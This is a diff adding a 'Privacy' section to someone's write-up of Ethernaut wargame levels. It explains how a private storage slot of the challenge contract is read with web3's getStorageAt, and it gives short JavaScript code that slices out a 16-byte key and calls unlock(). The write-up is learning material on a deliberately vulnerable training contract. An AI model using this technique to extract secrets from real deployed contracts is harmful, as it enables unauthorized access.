@@ -46,4 +46,22 @@ Maybe take a look at ...
 * https://solidity.readthedocs.io/en/develop/security-considerations.html#use-the-checks-effects-interactions-pattern
 
 
+### Privacy
+
+https://ethernaut.openzeppelin.com/level/0x11343d543778213221516D004ED82C45C3c8788B
+
+This one was similar to the Vault, where I needed to access the private value via the `getStorageAt()` function. That part I go right, but I struggled with processing the value correctly. 
+
+```
+const keyData = await web3.eth.getStorageAt(contract.address, 5);
+
+// keyData = 0xb301d4297362fcf4a1c2af4cf9d84bbdfcc7b45ad2ab96796b13229669b609aa
+
+const key16 = `${keyData.slice(0, 34)}`
+
+// '0xb301d4297362fcf4a1c2af4cf9d84bbd'
+
+await contract.unlock( key16 )
+
+```
 
